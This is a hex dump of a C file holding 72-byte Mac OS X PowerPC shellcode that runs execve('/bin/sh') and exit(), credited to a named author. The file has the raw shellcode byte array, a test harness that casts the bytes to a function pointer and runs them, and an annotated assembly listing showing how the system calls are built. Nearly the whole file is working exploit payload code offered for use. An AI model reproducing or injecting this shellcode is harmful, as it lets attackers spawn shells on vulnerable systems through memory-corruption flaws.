00000000  2f 2a 0d 0a 20 2a 20 5b  4d 61 63 4f 53 58 2f 50  |/*.. * [MacOSX/P|
00000010  6f 77 65 72 50 43 5d 0d  0a 20 2a 20 53 68 65 6c  |owerPC].. * Shel|
00000020  6c 63 6f 64 65 20 66 6f  72 3a 20 65 78 65 63 76  |lcode for: execv|
00000030  65 28 22 2f 62 69 6e 2f  73 68 22 2c 20 5b 22 2f  |e("/bin/sh", ["/|
00000040  62 69 6e 2f 73 68 22 5d  2c 20 4e 55 4c 4c 29 2c  |bin/sh"], NULL),|
00000050  20 65 78 69 74 28 29 0d  0a 20 2a 20 37 32 20 62  | exit().. * 72 b|
00000060  79 74 65 73 0d 0a 20 2a  20 68 6f 70 68 65 74 20  |ytes.. * hophet |
00000070  5b 61 74 5d 20 67 6d 61  69 6c 2e 63 6f 6d 0d 0a  |[at] gmail.com..|
00000080  20 2a 20 68 74 74 70 3a  2f 2f 77 77 77 2e 6e 6c  | * http://www.nl|
00000090  61 62 73 2e 63 6f 6d 2e  62 72 2f 7e 68 6f 70 68  |abs.com.br/~hoph|
000000a0  65 74 2f 0d 0a 20 2a 0d  0a 20 2a 2f 0d 0a 0d 0a  |et/.. *.. */....|
000000b0  23 69 6e 63 6c 75 64 65  20 22 73 74 64 69 6f 2e  |#include "stdio.|
000000c0  68 22 0d 0a 23 69 6e 63  6c 75 64 65 20 22 73 74  |h"..#include "st|
000000d0  72 69 6e 67 2e 68 22 0d  0a 0d 0a 63 68 61 72 20  |ring.h"....char |
000000e0  73 68 65 6c 6c 63 6f 64  65 5b 5d 20 3d 20 0d 0a  |shellcode[] = ..|
000000f0  0d 0a 22 5c 78 37 63 5c  78 61 35 5c 78 32 61 5c  |.."\x7c\xa5\x2a\|
00000100  78 37 39 22 0d 0a 22 5c  78 34 30 5c 78 38 32 5c  |x79".."\x40\x82\|
00000110  78 66 66 5c 78 66 64 22  0d 0a 22 5c 78 37 64 5c  |xff\xfd".."\x7d\|
00000120  78 36 38 5c 78 30 32 5c  78 61 36 22 0d 0a 22 5c  |x68\x02\xa6".."\|
00000130  78 33 62 5c 78 65 62 5c  78 30 31 5c 78 37 31 22  |x3b\xeb\x01\x71"|
00000140  0d 0a 22 5c 78 33 39 5c  78 34 30 5c 78 30 31 5c  |.."\x39\x40\x01\|
00000150  78 37 31 22 0d 0a 22 5c  78 33 39 5c 78 31 66 5c  |x71".."\x39\x1f\|
00000160  78 66 65 5c 78 63 65 22  0d 0a 22 5c 78 37 63 5c  |xfe\xce".."\x7c\|
00000170  78 61 38 5c 78 32 39 5c  78 61 65 22 0d 0a 22 5c  |xa8\x29\xae".."\|
00000180  78 33 38 5c 78 37 66 5c  78 66 65 5c 78 63 37 22  |x38\x7f\xfe\xc7"|
00000190  0d 0a 22 5c 78 39 30 5c  78 36 31 5c 78 66 66 5c  |.."\x90\x61\xff\|
000001a0  78 66 38 22 0d 0a 22 5c  78 39 30 5c 78 61 31 5c  |xf8".."\x90\xa1\|
000001b0  78 66 66 5c 78 66 63 22  0d 0a 22 5c 78 33 38 5c  |xff\xfc".."\x38\|
000001c0  78 38 31 5c 78 66 66 5c  78 66 38 22 0d 0a 22 5c  |x81\xff\xf8".."\|
000001d0  78 33 38 5c 78 30 61 5c  78 66 65 5c 78 63 61 22  |x38\x0a\xfe\xca"|
000001e0  0d 0a 22 5c 78 34 34 5c  78 66 66 5c 78 66 66 5c  |.."\x44\xff\xff\|
000001f0  78 30 32 22 0d 0a 22 5c  78 36 30 5c 78 36 30 5c  |x02".."\x60\x60\|
00000200  78 36 30 5c 78 36 30 22  0d 0a 22 5c 78 33 38 5c  |x60\x60".."\x38\|
00000210  78 30 61 5c 78 66 65 5c  78 39 30 22 0d 0a 22 5c  |x0a\xfe\x90".."\|
00000220  78 34 34 5c 78 66 66 5c  78 66 66 5c 78 30 32 22  |x44\xff\xff\x02"|
00000230  0d 0a 22 5c 78 32 66 5c  78 36 32 5c 78 36 39 5c  |.."\x2f\x62\x69\|
00000240  78 36 65 22 0d 0a 22 5c  78 32 66 5c 78 37 33 5c  |x6e".."\x2f\x73\|
00000250  78 36 38 5c 78 35 34 22  3b 0d 0a 0d 0a 69 6e 74  |x68\x54";....int|
00000260  20 6d 61 69 6e 28 29 20  7b 0d 0a 0d 0a 09 76 6f  | main() {.....vo|
00000270  69 64 20 28 2a 70 29 28  29 3b 0d 0a 09 70 20 3d  |id (*p)();...p =|
00000280  20 28 76 6f 69 64 20 2a  29 26 73 68 65 6c 6c 63  | (void *)&shellc|
00000290  6f 64 65 3b 0d 0a 09 70  72 69 6e 74 66 28 22 4c  |ode;...printf("L|
000002a0  65 6e 67 68 74 3a 20 25  64 5c 6e 22 2c 20 73 74  |enght: %d\n", st|
000002b0  72 6c 65 6e 28 73 68 65  6c 6c 63 6f 64 65 29 29  |rlen(shellcode))|
000002c0  3b 0d 0a 09 70 28 29 3b  0d 0a 7d 0d 0a 2f 2a 0d  |;...p();..}../*.|
000002d0  0a 2e 67 6c 6f 62 6c 20  5f 6d 61 69 6e 0d 0a 2e  |..globl _main...|
000002e0  74 65 78 74 0d 0a 5f 6d  61 69 6e 3a 0d 0a 20 20  |text.._main:..  |
000002f0  20 20 20 20 20 20 78 6f  72 2e 20 20 20 20 72 35  |      xor.    r5|
00000300  2c 20 72 35 2c 20 72 35  09 2f 2f 20 72 35 20 3d  |, r5, r5.// r5 =|
00000310  20 4e 55 4c 4c 0d 0a 20  20 20 20 20 20 20 20 62  | NULL..        b|
00000320  6e 65 6c 20 20 20 20 5f  6d 61 69 6e 0d 0a 20 20  |nel    _main..  |
00000330  20 20 20 20 20 20 6d 66  6c 72 20 20 20 20 72 31  |      mflr    r1|
00000340  31 0d 0a 20 20 20 20 20  20 20 20 61 64 64 69 20  |1..        addi |
00000350  20 20 20 72 33 31 2c 20  72 31 31 2c 20 33 36 39  |   r31, r11, 369|
00000360  0d 0a 20 20 20 20 20 20  20 20 6c 69 20 20 20 20  |..        li    |
00000370  20 20 72 31 30 2c 20 33  36 39 0d 0a 20 20 20 20  |  r10, 369..    |
00000380  20 20 20 20 61 64 64 69  20 20 20 20 72 38 2c 20  |    addi    r8, |
00000390  72 33 31 2c 20 2d 33 30  36 0d 0a 20 20 20 20 20  |r31, -306..     |
000003a0  20 20 20 73 74 62 78 20  20 20 20 72 35 2c 20 72  |   stbx    r5, r|
000003b0  38 2c 20 72 35 0d 0a 20  20 20 20 20 20 20 20 61  |8, r5..        a|
000003c0  64 64 69 20 20 20 20 72  33 2c 20 72 33 31 2c 20  |ddi    r3, r31, |
000003d0  2d 33 31 33 0d 0a 20 20  20 20 20 20 20 20 73 74  |-313..        st|
000003e0  77 20 20 20 20 20 72 33  2c 20 2d 38 28 72 31 29  |w     r3, -8(r1)|
000003f0  09 2f 2f 20 5b 2f 62 69  6e 2f 73 68 5d 0d 0a 20  |.// [/bin/sh].. |
00000400  20 20 20 20 20 20 20 73  74 77 20 20 20 20 20 72  |       stw     r|
00000410  35 2c 20 2d 34 28 72 31  29 0d 0a 20 20 20 20 20  |5, -4(r1)..     |
00000420  20 20 20 73 75 62 69 20  20 20 20 72 34 2c 20 72  |   subi    r4, r|
00000430  31 2c 20 38 09 2f 2f 20  5b 2f 62 69 6e 2f 73 68  |1, 8.// [/bin/sh|
00000440  5d 0d 0a 20 20 20 20 20  20 20 20 61 64 64 69 20  |]..        addi |
00000450  20 20 20 72 30 2c 20 72  31 30 2c 20 2d 33 31 30  |   r0, r10, -310|
00000460  09 2f 2f 20 72 30 20 3d  20 35 39 0d 0a 20 20 20  |.// r0 = 59..   |
00000470  20 20 20 20 20 2e 6c 6f  6e 67 20 20 20 30 78 34  |     .long   0x4|
00000480  34 66 66 66 66 30 32 09  2f 2f 20 73 63 20 6f 70  |4ffff02.// sc op|
00000490  63 6f 64 65 0d 0a 20 20  20 20 20 20 20 20 2e 6c  |code..        .l|
000004a0  6f 6e 67 09 30 78 36 30  36 30 36 30 36 30 09 2f  |ong.0x60606060./|
000004b0  2f 20 4e 4f 50 0d 0a 20  20 20 20 20 20 20 20 61  |/ NOP..        a|
000004c0  64 64 69 20 20 20 20 72  30 2c 20 72 31 30 2c 20  |ddi    r0, r10, |
000004d0  2d 33 36 38 09 2f 2f 20  72 30 20 3d 20 31 0d 0a  |-368.// r0 = 1..|
000004e0  20 20 20 20 20 20 20 20  2e 6c 6f 6e 67 20 20 20  |        .long   |
000004f0  30 78 34 34 66 66 66 66  30 32 09 2f 2f 20 73 63  |0x44ffff02.// sc|
00000500  20 6f 70 63 6f 64 65 0d  0a 73 74 72 69 6e 67 3a  | opcode..string:|
00000510  09 2e 61 73 63 69 7a 09  22 2f 62 69 6e 2f 73 68  |..asciz."/bin/sh|
00000520  54 22 0d 0a 2a 2f                                 |T"..*/|
00000526
